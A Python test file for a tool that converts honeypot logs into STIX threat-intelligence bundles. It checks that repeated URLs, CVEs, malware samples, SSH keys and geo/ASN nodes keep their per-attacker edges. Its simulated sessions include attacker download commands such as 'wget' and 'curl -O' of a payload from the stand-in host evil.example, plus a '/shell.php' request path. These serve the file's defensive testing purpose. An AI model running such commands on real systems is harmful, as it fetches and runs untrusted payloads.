"""`_dedup` returning None must not delete the edge that needed the node.

`_dedup` answers "should this bundle carry the node?"; a caller about to
draw an edge is asking "is there a node here to anchor on?". Both answers
are spelled None, and every builder conflated them behind `if obj:`.

Content-addressing made the collision routine rather than rare: identical
values share an id, so the SECOND and every later session in a bundle that
touches a known CVE / technique / sample / URL / domain got None and lost
its per-session edge. The node survives; the attribution — who did this —
is what disappears, which is the only thing those edges carry.

Every test below builds TWO sessions from ONE builder and asserts over the
SECOND. The first exists only to prime `_emitted_ids`.
"""
from __future__ import annotations

import logging
from datetime import datetime, timezone

from tpot2cti.parsers.base import AttackSession, ParsedEvent
from tpot2cti.stix_ids import (
    attacker_ip_indicator_id,
    attacker_ip_observable_id,
    generate_attack_pattern_id,
    generate_domain_id,
    generate_file_id,
    generate_malware_id,
    generate_url_id,
    generate_vulnerability_id,
    generate_cryptographic_key_id,
    attacker_ip_indicator_id,
    attacker_ip_observable_id,
    generate_country_location_id,
    generate_city_location_id,
    generate_autonomous_system_id,
    generate_ipv4_id,
)

NOW = datetime(2026, 8, 7, tzinfo=timezone.utc)

IP_A = "203.0.113.10"
IP_B = "198.51.100.20"
SHA = "a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2"
URL = "http://evil.example/payload.sh"
DOMAIN = "evil.example"
CVE = "CVE-2021-44228"


def _session(etype, *, ip, meta=None, dst_port=80, **kw):
    """A session built the way the parsers build one.

    Via ParsedEvent/AttackSession.from_event on purpose: several builders
    (build_cowrie_session among them) return [] for a hand-constructed
    AttackSession, so whole-session assertions over one would pass by
    asserting over an empty list.
    """
    ev = ParsedEvent(
        src_ip=ip, timestamp=NOW, sensor_hostname="s1", event_type=etype,
        dst_port=dst_port, src_country_code="DE", src_asn=64512,
    )
    ev.meta = dict(meta or {})
    s = AttackSession.from_event(ev)
    for k, v in kw.items():
        setattr(s, k, v)
    return s


def _edges(objs, src, rel_type, dst):
    return [
        o for o in objs
        if o.get("type") == "relationship"
        and o.get("relationship_type") == rel_type
        and o.get("source_ref") == src
        and o.get("target_ref") == dst
    ]


def _has_edge(objs, src, rel_type, dst):
    return bool(_edges(objs, src, rel_type, dst))


# ---------------------------------------------------------------------------
# The helper itself
# ---------------------------------------------------------------------------

def test_emit_node_distinguishes_the_two_nones(builder):
    """The whole defect in one assertion pair."""
    out: list[dict] = []
    # Never built, never will be -> nothing to anchor on. An edge here would
    # dangle: OpenCTI accepts the ref and then never resolves it.
    assert builder._emit_node(None, out=out, node_id="url--never-built") is None
    assert out == []

    # Built once, then a duplicate. The duplicate still has a node to point at.
    first = builder.build_url(URL)
    assert first is not None, "guard: the first build must actually happen"
    out2: list[dict] = []
    anchor = builder._emit_node(
        builder.build_url(URL), out=out2, node_id=generate_url_id(URL))
    assert anchor == first["id"], (
        "the node IS in this bundle — a duplicate must still yield an anchor"
    )
    assert out2 == [], "and must not re-append the node"


def test_emit_node_reports_an_anchor_that_does_not_match_the_node(builder, caplog):
    """A caller hashing a different value than build_* did is silent otherwise.

    The first occurrence still behaves correctly (the object's own id is
    used), so the mismatch only shows up as dropped edges on duplicates —
    invisible unless it is announced.
    """
    out: list[dict] = []
    with caplog.at_level(logging.ERROR):
        anchor = builder._emit_node(
            builder.build_url(URL), out=out, node_id="url--0000-wrong")
    assert anchor == out[0]["id"], "must trust the object it actually appended"
    assert any("anchor id" in r.message for r in caplog.records), (
        "a mismatched anchor must be reported, not silently absorbed"
    )


def test_emit_url_anchors_on_the_canonical_value(builder):
    """valid_url strips whitespace before hashing; the anchor must too."""
    out: list[dict] = []
    first = builder._emit_url("  " + URL + "  ", out=out)
    assert first == generate_url_id(URL)
    # The duplicate path is the one that needs the id to be right: hashing the
    # padded input here would miss `_emitted_ids` and drop the edge.
    assert builder._emit_url("  " + URL + "  ", out=[]) == first


def test_emit_url_still_refuses_an_invalid_url(builder):
    """The fix must not turn a rejected value into a dangling anchor."""
    out: list[dict] = []
    assert builder._emit_url("/admin.php", out=out) is None
    assert out == []


# ---------------------------------------------------------------------------
# build_session_attack_patterns — runs for EVERY session
# ---------------------------------------------------------------------------

def test_second_session_still_indicates_a_known_attack_pattern(builder):
    """~30 techniques total across a bundle, so nearly every session is the
    duplicate case. Losing this edge empties the ATT&CK matrix of all but
    the first attacker to evidence each technique."""
    a = _session("Cowrie", ip=IP_A, dst_port=22,
                 credentials_tried=[("root", "123456")])
    b = _session("Cowrie", ip=IP_B, dst_port=22,
                 credentials_tried=[("admin", "admin")])
    builder.build_session_attack_patterns(a)
    objs = builder.build_session_attack_patterns(b)

    ap_id = generate_attack_pattern_id("Brute Force")
    assert _has_edge(objs, attacker_ip_indicator_id(IP_B), "indicates", ap_id), (
        f"second attacker lost its indicates edge to T1110; got {objs!r}"
    )


def test_first_session_is_the_one_that_carries_the_node(builder):
    """Positive control: the fix must not start re-emitting the SDO.

    Re-emitting duplicates is what overflowed SQLite's bind-variable limit
    in the 2026-07-19 outage — the opposite failure, equally live.
    """
    a = _session("Cowrie", ip=IP_A, dst_port=22,
                 credentials_tried=[("root", "123456")])
    b = _session("Cowrie", ip=IP_B, dst_port=22,
                 credentials_tried=[("admin", "admin")])
    first = builder.build_session_attack_patterns(a)
    second = builder.build_session_attack_patterns(b)
    aps_first = [o for o in first if o["type"] == "attack-pattern"]
    aps_second = [o for o in second if o["type"] == "attack-pattern"]
    assert aps_first, "guard: the first session must emit the node"
    assert aps_second == [], "the duplicate must not re-mint the SDO"


# ---------------------------------------------------------------------------
# Suricata
# ---------------------------------------------------------------------------

def _suricata(ip, **meta):
    base = {"signature": "ET EXPLOIT test", "signature_id": 2001}
    base.update(meta)
    return _session("Suricata", ip=ip, meta=base)


def test_suricata_second_alert_still_indicates_the_technique(builder):
    """A signature's technique repeats on every alert it fires."""
    builder.build_suricata_alert(_suricata(IP_A, mitre_techniques=["T1190"]))
    objs = builder.build_suricata_alert(_suricata(IP_B, mitre_techniques=["T1190"]))
    ap_id = generate_attack_pattern_id("Exploit Public-Facing Application")
    assert _has_edge(objs, attacker_ip_indicator_id(IP_B), "indicates", ap_id), (
        "second Suricata alert lost its indicates edge to the technique"
    )


def test_suricata_second_alert_still_indicates_the_generic_pattern(cfg):
    """"Network Attack" is ONE node for the whole bundle by construction, so
    every alert without a known technique but the first hits the duplicate
    case — i.e. V1_SPEC §5.2's "always have an indicates-target" was met for
    exactly one alert per cycle.

    Off by default (cycle.emit_generic_attack_pattern), so the branch has to
    be turned on to be exercised at all.
    """
    import dataclasses
    from tpot2cti.stix.builder import STIXBuilder
    on = dataclasses.replace(cfg, cycle=dataclasses.replace(
        cfg.cycle, emit_generic_attack_pattern=True))
    builder = STIXBuilder(on)

    first = builder.build_suricata_alert(_suricata(IP_A))
    ap_id = generate_attack_pattern_id("Network Attack")
    assert any(o["id"] == ap_id for o in first), "guard: the branch must be on"

    objs = builder.build_suricata_alert(_suricata(IP_B))
    assert _has_edge(objs, attacker_ip_indicator_id(IP_B), "indicates", ap_id)


def test_suricata_second_alert_still_indicates_the_cve(builder):
    """The `indicates` edge IS the "who tried this CVE" answer."""
    builder.build_suricata_alert(_suricata(IP_A, cves=[CVE]))
    objs = builder.build_suricata_alert(_suricata(IP_B, cves=[CVE]))
    assert _has_edge(objs, attacker_ip_indicator_id(IP_B), "indicates",
                     generate_vulnerability_id(CVE)), (
        "second exploiter of the CVE was dropped from the Vulnerability's "
        "related entities"
    )


def test_suricata_second_alert_still_links_the_requested_url(builder):
    """Found by sweeping for the pattern rather than from the review list —
    build_suricata_alert's http_url block had the same gate."""
    builder.build_suricata_alert(
        _suricata(IP_A, http_url="/shell.php", http_host=DOMAIN))
    objs = builder.build_suricata_alert(
        _suricata(IP_B, http_url="/shell.php", http_host=DOMAIN))
    assert _has_edge(objs, generate_url_id(f"http://{DOMAIN}/shell.php"),
                     "related-to", attacker_ip_observable_id(IP_B)), (
        "second alert for the same request path lost its URL -> IPv4 edge"
    )


def test_suricata_domain_resolves_to_each_destination_it_was_seen_for(builder):
    """The SNI repeats across alerts; the address it resolved to does not.
    Gating on the Domain node kept only the first resolution."""
    a = _suricata(IP_A, tls_sni=DOMAIN)
    b = _suricata(IP_B, tls_sni=DOMAIN)
    a.events[0].dst_ip = "192.0.2.10"
    b.events[0].dst_ip = "192.0.2.20"
    builder.build_suricata_alert(a)
    objs = builder.build_suricata_alert(b)
    from tpot2cti.stix_ids import generate_ipv4_id
    assert _has_edge(objs, generate_domain_id(DOMAIN), "resolves-to",
                     generate_ipv4_id("192.0.2.20")), (
        "second observed resolution of the SNI was dropped"
    )


# ---------------------------------------------------------------------------
# Web family
# ---------------------------------------------------------------------------

def _web(ip):
    s = _session("Wordpot", ip=ip, meta={
        "matched_cve": CVE,
        "attack_type": "Log4Shell exploitation",
        "mitre_technique": "T1190",
    })
    s.urls = [URL]
    return s


def test_web_second_session_still_linked_to_the_requested_url(builder):
    """Also found by sweep, not from the review list."""
    builder.build_wordpot_session(_web(IP_A))
    objs = builder.build_wordpot_session(_web(IP_B))
    assert _has_edge(objs, attacker_ip_observable_id(IP_B), "related-to",
                     generate_url_id(URL)), (
        "second web attacker requesting the same path lost its IPv4 -> URL edge"
    )


def test_web_second_session_still_indicates_the_cve_and_technique(builder):
    """Scanners spray the whole hive, so the duplicate case is the norm."""
    builder.build_wordpot_session(_web(IP_A))
    objs = builder.build_wordpot_session(_web(IP_B))
    ind_b = attacker_ip_indicator_id(IP_B)
    assert _has_edge(objs, ind_b, "indicates", generate_vulnerability_id(CVE)), (
        "second web attacker lost its edge to the Vulnerability"
    )
    assert _has_edge(objs, ind_b, "indicates",
                     generate_attack_pattern_id("Log4Shell exploitation")), (
        "second web attacker lost its edge to the AttackPattern"
    )


# ---------------------------------------------------------------------------
# Cowrie
# ---------------------------------------------------------------------------

def _cowrie(ip):
    return _session("Cowrie", ip=ip, dst_port=22, malware_hashes=[SHA],
                    urls=[URL], commands=["wget " + URL])


def test_cowrie_second_attacker_still_linked_to_the_shared_sample(builder):
    """A widely-distributed sample is a duplicate File for every attacker
    after the first — deleting exactly the "who else dropped this" answer
    that makes the sample worth publishing."""
    builder.build_cowrie_session(_cowrie(IP_A))
    objs = builder.build_cowrie_session(_cowrie(IP_B))
    assert objs, "guard: the session must actually build"
    assert _has_edge(objs, generate_file_id(SHA), "related-to",
                     attacker_ip_observable_id(IP_B)), (
        "second attacker to drop the sample lost its File -> IPv4 edge"
    )


def test_cowrie_second_attacker_still_linked_to_the_shared_url(builder):
    builder.build_cowrie_session(_cowrie(IP_A))
    objs = builder.build_cowrie_session(_cowrie(IP_B))
    assert _has_edge(objs, generate_url_id(URL), "related-to",
                     attacker_ip_observable_id(IP_B)), (
        "second attacker to reference the dropper URL lost its URL -> IPv4 edge"
    )


def test_cowrie_download_chain_url_to_file_survives_a_duplicate_url(builder):
    """One C2 URL serving a second-stage payload to a later attacker.

    _link_download_chain already told the two Nones apart by hand; this locks
    that in now that it goes through the shared helper. Different sha on each
    side on purpose — the same (url, sha) pair yields an identical edge that
    build_relationship dedups anyway, which would prove nothing.
    """
    sha2 = "b" * 63 + "c"
    a = _session("Cowrie", ip=IP_A, dst_port=22, malware_hashes=[SHA],
                 downloads=[{"url": URL, "sha256": SHA}])
    b = _session("Cowrie", ip=IP_B, dst_port=22, malware_hashes=[sha2],
                 downloads=[{"url": URL, "sha256": sha2}])
    builder.build_cowrie_session(a)
    objs = builder.build_cowrie_session(b)
    assert _has_edge(objs, generate_url_id(URL), "related-to",
                     generate_file_id(sha2)), (
        "second-stage payload lost its downloaded-from edge to the known URL"
    )


# ---------------------------------------------------------------------------
# Malware-drop family
# ---------------------------------------------------------------------------

def _drop(ip):
    return _session("Dionaea", ip=ip, malware_hashes=[SHA], urls=[URL],
                    domains=[DOMAIN])


def test_malware_family_second_attacker_keeps_file_url_and_domain_edges(builder):
    builder.build_dionaea_session(_drop(IP_A))
    objs = builder.build_dionaea_session(_drop(IP_B))
    ipv4_b = attacker_ip_observable_id(IP_B)
    assert _has_edge(objs, generate_file_id(SHA), "related-to", ipv4_b), \
        "File -> IPv4 lost for the second attacker"
    assert _has_edge(objs, generate_url_id(URL), "related-to", ipv4_b), \
        "URL -> IPv4 lost for the second attacker"
    assert _has_edge(objs, generate_domain_id(DOMAIN), "related-to", ipv4_b), \
        "Domain -> IPv4 lost for the second attacker"


# ---------------------------------------------------------------------------
# Protocol family — URLs extracted from the command transcript
# ---------------------------------------------------------------------------

def _protocol(ip, sid, url=URL):
    """Distinct commands per attacker so the Process is NOT the duplicate
    under test — the shared node here is the URL inside the transcript."""
    return _session("ConPot", ip=ip, dst_port=502,
                    commands=[f"# {sid}", "curl -O " + url])


def test_protocol_family_second_attacker_keeps_the_payload_url_edge(builder):
    """SSH/protocol honeypots log `wget http://c2/x.sh` but never run it, so
    this URL and its C2 host are the only IoCs those sessions produce."""
    builder.build_conpot_session(_protocol(IP_A, "a"))
    objs = builder.build_conpot_session(_protocol(IP_B, "b"))
    assert _has_edge(objs, generate_url_id(URL), "related-to",
                     attacker_ip_observable_id(IP_B)), (
        "second attacker fetching the payload URL lost its URL -> IPv4 edge"
    )


def test_protocol_family_new_url_still_reaches_an_already_seen_host(builder):
    """A C2 host serves many payload paths. The URL is new, its host is the
    duplicate — so `if _host_obj:` dropped the edge that says where this new
    payload lives. (Same URL on both sides would prove nothing: that edge is
    identical across sessions and build_relationship dedups it anyway.)"""
    other = "http://evil.example/second-stage.bin"
    builder.build_conpot_session(_protocol(IP_A, "a"))
    objs = builder.build_conpot_session(_protocol(IP_B, "b", url=other))
    assert any(o["id"] == generate_url_id(other) for o in objs), \
        "guard: the second URL must be new in this bundle"
    assert _has_edge(objs, generate_url_id(other), "related-to",
                     generate_domain_id(DOMAIN)), (
        "new payload URL lost its edge to the already-seen C2 host"
    )


def test_protocol_family_second_attacker_keeps_the_protocol_attack_pattern(builder):
    """ap_name is fixed per protocol family — a duplicate from session two on."""
    builder.build_conpot_session(_protocol(IP_A, "a"))
    objs = builder.build_conpot_session(_protocol(IP_B, "b"))
    assert _has_edge(
        objs, attacker_ip_indicator_id(IP_B), "indicates",
        generate_attack_pattern_id("ICS/SCADA protocol interaction"),
    )


# ---------------------------------------------------------------------------
# Malware-sample ingest — the family attribution is the whole point
# ---------------------------------------------------------------------------

def test_ingest_attributes_a_sample_the_honeypots_already_captured(builder):
    """The realistic ordering: honeypot logs run first in the cycle and emit
    the File, then the sample ingest adds the VirusTotal family. Both the
    File and its Indicator are duplicates by then, so every attribution edge
    used to vanish — and attribution is the only thing this ingest adds."""
    from tpot2cti.ingest import malware as ing

    # The honeypot path emits File + File-Indicator earlier in the bundle.
    primed = builder.build_dionaea_session(_drop(IP_A))
    assert any(o["type"] == "file" for o in primed), "guard: File must be primed"

    objs = ing.build_objects(builder, {
        "sha256": SHA, "file_size": 1024, "malware_family": "mirai",
        "vt_malicious": 38, "vt_total": 64,
    })
    malware_id = generate_malware_id("mirai")
    assert any(o["type"] == "malware" for o in objs), \
        "guard: the Malware SDO itself is new and must be emitted"
    assert _has_edge(objs, generate_file_id(SHA), "related-to", malware_id), (
        "File -> Malware attribution lost because the File was a duplicate"
    )


def test_ingest_still_emits_nothing_dangling_for_a_junk_family(builder):
    """Negative control: an unusable family must not produce edges to a
    Malware SDO that was never built."""
    from tpot2cti.ingest import malware as ing
    objs = ing.build_objects(builder, {"sha256": SHA, "malware_family": "shell"})
    assert not any(o["type"] == "malware" for o in objs)
    assert not any(
        o.get("type") == "relationship" and "malware--" in o.get("target_ref", "")
        for o in objs
    ), "edge to a Malware SDO that does not exist"


# ── Round three: the sites the review's list did not contain ──────────────
#
# The sweep above was worked from a review's enumeration of call sites. A
# mechanical sweep of the file afterwards found three more deduping builders
# nobody had listed: cryptographic-key, attacker SSH key, and IP indicator.
# tests/test_dedup_none_sweep_is_complete.py now asks that question against
# the AST so round four does not depend on someone noticing.
#
# These three matter more than most, because a SHARED node is the entire
# point of each of them:
#   - a HASSH/JA3 groups attackers using the same client toolchain
#   - a planted SSH key groups attackers with the same C&C identity
#   - an IP indicator collects every session from one attacker
# so "many sessions reach this node" is the intended case, not the corner.

def test_a_second_attacker_sharing_a_hassh_keeps_its_edge(builder):
    """The HASSH pivot IS the set of attackers sharing it."""
    hassh = "06046964c022c6407d15a27b12a6a4fb"
    a = builder.build_cowrie_session(_session("Cowrie", ip=IP_A, hassh=hassh))
    b = builder.build_cowrie_session(_session("Cowrie", ip=IP_B, hassh=hassh))
    ck_id = generate_cryptographic_key_id(hassh)
    assert _edges(a, ck_id, "related-to", attacker_ip_observable_id(IP_A)), \
        "guard: first attacker must get the edge"
    assert not any(o.get("id") == ck_id for o in b), \
        "guard: the shared node must NOT be re-emitted — that is the dedup"
    assert _edges(b, ck_id, "related-to", attacker_ip_observable_id(IP_B)), (
        "second attacker sharing a HASSH lost its edge to the pivot — the "
        "pivot then shows one IP instead of the group"
    )


def test_a_second_attacker_planting_the_same_ssh_key_keeps_its_edge(builder):
    """Planted-key campaigns are hundreds of IPs on ONE key (e.g. mdrfckr)."""
    key = {"fingerprint": "SHA256:" + "q" * 43, "key": "AAAAB3NzaC1yc2E" + "A" * 20,
           "type": "ssh-rsa", "comment": "mdrfckr"}
    a = builder.build_cowrie_session(_session("Cowrie", ip=IP_A, planted_ssh_keys=[key]))
    b = builder.build_cowrie_session(_session("Cowrie", ip=IP_B, planted_ssh_keys=[key]))
    ck_id = generate_cryptographic_key_id(key["fingerprint"])
    assert _edges(a, attacker_ip_observable_id(IP_A), "related-to", ck_id), \
        "guard: first planter must get the edge"
    assert _edges(b, attacker_ip_observable_id(IP_B), "related-to", ck_id), (
        "second IP planting the same key lost its edge — the campaign view "
        "collapses to whichever IP happened to be parsed first"
    )


def test_a_second_session_from_one_ip_is_counted_in_its_sighting(builder):
    """One attacker, two sessions in a bundle (different parsers see them).

    This test asserted, until 2026-08-19, that the second session emitted its
    OWN Sighting object. That was the right INTENT with the wrong mechanism,
    and the mechanism was itself the bug: Sighting ids were session-scoped, so
    OpenCTI merged them all into one object and kept every discarded id in an
    alias array that reached 1.7 MB. Sighting ids are content-addressed now,
    so the second session correctly produces no new object.

    What must not change is the intent: the second observation has to SHOW UP.
    A Sighting is an aggregate, so it shows up as count, not as another node.
    """
    a = builder.build_cowrie_session(_session("Cowrie", ip=IP_A))
    b = builder.build_cowrie_session(_session("Cowrie", ip=IP_A, session_id="s2"))
    ind_id = attacker_ip_indicator_id(IP_A)

    kept = [o for o in a if o.get("type") == "sighting"
            and o.get("sighting_of_ref") == ind_id]
    assert kept, "guard: the first session must emit the Sighting"
    assert not [o for o in b if o.get("type") == "sighting"
                and o.get("sighting_of_ref") == ind_id], (
        "the second session emitted a SECOND Sighting object for the same "
        "(entity, sensor) — that is the alias-array defect"
    )
    assert kept[0]["count"] >= 2, (
        f"count is {kept[0]['count']}: the second session's observation was "
        "dropped rather than merged — observed volume is understated"
    )


# ── Round four: the nodes an allowlist wrongly excused ────────────────────
#
# Round three added a completeness test and, in the same commit, EXCUSED the
# geo/ASN nodes there on the claim that their inbound edges are identical
# across sessions. That claim was false and codex reproduced the loss: the
# edge source is the attacker's IP, so two attackers in one country produce
# two DIFFERENT edges to one SHARED node — the exact shape of this defect.
# A wrong allowlist entry is worse than a missing test, because it tells the
# next reader the question was already answered.
#
# Geo and ASN are the most-shared nodes in the graph: thousands of attacker
# IPs resolve to a few hundred countries and a few thousand ASNs. So this was
# not a rare corner — under `if country:` only the first attacker per country
# per bundle had a country at all.

def _ctx(builder, ip, *, cc="DE", city="Berlin", asn=64512):
    ev = ParsedEvent(
        src_ip=ip, timestamp=NOW, sensor_hostname="s1", event_type="Cowrie",
        dst_port=22, src_country_code=cc, src_asn=asn,
    )
    ev.src_city = city
    ev.meta = {}
    return builder.build_attacker_context(ev, session=AttackSession.from_event(ev))


def test_a_second_attacker_in_the_same_country_still_gets_located_at(builder):
    a = _ctx(builder, IP_A)
    b = _ctx(builder, IP_B)
    loc = [o for o in a if o.get("type") == "location" and o.get("country") == "DE"]
    assert loc, "guard: the first attacker must emit the country node"
    assert not any(o.get("type") == "location" and o.get("country") == "DE"
                   and "city" not in o for o in b), \
        "guard: the shared country node must NOT be re-emitted — that is the dedup"
    assert _edges(b, attacker_ip_observable_id(IP_B), "located-at",
                  generate_country_location_id("DE")), (
        "second attacker in the same country has no located-at edge — the "
        "country node then shows one IP instead of every attacker from it"
    )


def test_a_second_attacker_in_the_same_city_still_gets_located_at(builder):
    _ctx(builder, IP_A)
    b = _ctx(builder, IP_B)
    assert _edges(b, attacker_ip_observable_id(IP_B), "located-at",
                  generate_city_location_id("DE", "Berlin")), \
        "second attacker in the same city lost its located-at edge"


def test_a_second_attacker_in_the_same_asn_still_belongs_to_it(builder):
    _ctx(builder, IP_A)
    b = _ctx(builder, IP_B)
    assert _edges(b, attacker_ip_observable_id(IP_B), "belongs-to",
                  generate_autonomous_system_id(64512)), (
        "second attacker in the same ASN lost its belongs-to edge — one "
        "hosting AS fronting thousands of IPs is exactly the fan-in an "
        "analyst wants and exactly what the gate was deleting"
    )


def test_a_second_domain_resolving_to_a_known_ip_keeps_its_resolves_to(builder):
    """Suricata SNI -> destination IP.

    The one codex found that I had argued was a false positive. My reasoning
    was that build_ipv4 does not call _dedup — true, and irrelevant: it
    RETURNS _build_ip_observable(...), which does. That indirection is also
    why the first version of the completeness test missed this whole family.

    Two different SNI domains hitting the same destination address is the
    normal case (shared CDN or hosting IP), and the second one lost its edge.
    """
    dst = "198.51.100.7"

    def alert(ip, sni):
        ev = ParsedEvent(
            src_ip=ip, timestamp=NOW, sensor_hostname="s1",
            event_type="Suricata", dst_port=443, dst_ip=dst,
            src_country_code="DE", src_asn=64512,
        )
        ev.meta = {"tls_sni": sni, "signature": "ET TLS test",
                   "signature_id": 2002}
        return builder.build_suricata_alert(AttackSession.from_event(ev))

    a = alert(IP_A, "first.example")
    b = alert(IP_B, "second.example")
    dst_id = generate_ipv4_id(dst)
    assert _edges(a, generate_domain_id("first.example"), "resolves-to", dst_id), \
        "guard: the first domain must get its resolves-to edge"
    assert not any(o.get("id") == dst_id for o in b), \
        "guard: the shared destination IP must NOT be re-emitted"
    assert _edges(b, generate_domain_id("second.example"), "resolves-to", dst_id), (
        "second domain resolving to an already-emitted IP lost its "
        "resolves-to edge — shared hosting then shows one domain"
    )


# ── Round five: the last excuse, and an assertion the fix exposed ─────────

def test_the_same_ip_with_different_geo_still_gets_both_edges(builder):
    """The case that killed the final allowlist entry.

    build_attacker_context used to `return out` the moment
    build_ip_observable returned None — conflating "not a usable address"
    with "already emitted this bundle". Harmless only while a repeated IP
    carries identical enrichment, which is not guaranteed: GeoIP can resolve
    one address to a different city or ASN on two events in the same window.
    Constructed by codex on review; it returned [] before the fix.
    """
    def ctx(cc, city, asn):
        ev = ParsedEvent(
            src_ip=IP_A, timestamp=NOW, sensor_hostname="s1",
            event_type="Cowrie", dst_port=22,
            src_country_code=cc, src_asn=asn,
        )
        ev.src_city = city
        ev.meta = {}
        return builder.build_attacker_context(
            ev, session=AttackSession.from_event(ev))

    ctx("DE", "Berlin", 64512)
    second = ctx("DE", "Munich", 64513)
    assert second, "the whole attacker context was dropped for a repeated IP"
    assert _edges(second, attacker_ip_observable_id(IP_A), "located-at",
                  generate_city_location_id("DE", "Munich")), \
        "the second city seen for this IP produced no located-at edge"
    assert _edges(second, attacker_ip_observable_id(IP_A), "belongs-to",
                  generate_autonomous_system_id(64513)), \
        "the second ASN seen for this IP produced no belongs-to edge"


def test_an_sni_never_resolves_to_the_attackers_own_address(builder):
    """A Suricata alert with SNI but no dst_ip must assert NOTHING.

    There was an `or session.src_ip` fallback: with no destination recorded,
    the code claimed the requested name resolves to the ATTACKER's address.
    Nothing establishes that — they sent us a name, and separately we saw
    where the packet came from. It was masked because build_ipv4 returned
    None for an address attacker-context had already emitted, so the edge was
    skipped by accident; anchoring the id removed the accident and left the
    assertion. This keeps the skip and drops the claim.
    """
    ev = ParsedEvent(
        src_ip=IP_A, timestamp=NOW, sensor_hostname="s1",
        event_type="Suricata", dst_port=443, dst_ip=None,
        src_country_code="DE", src_asn=64512,
    )
    ev.meta = {"tls_sni": DOMAIN, "signature": "ET TLS test",
               "signature_id": 2003}
    objs = builder.build_suricata_alert(AttackSession.from_event(ev))
    assert any(o.get("type") == "domain-name" for o in objs), \
        "guard: the SNI domain itself must still be emitted"
    assert not [o for o in objs if o.get("relationship_type") == "resolves-to"], (
        "emitted a resolves-to edge with no destination address — the only "
        "candidate left is the attacker's own IP, which is not a resolution"
    )
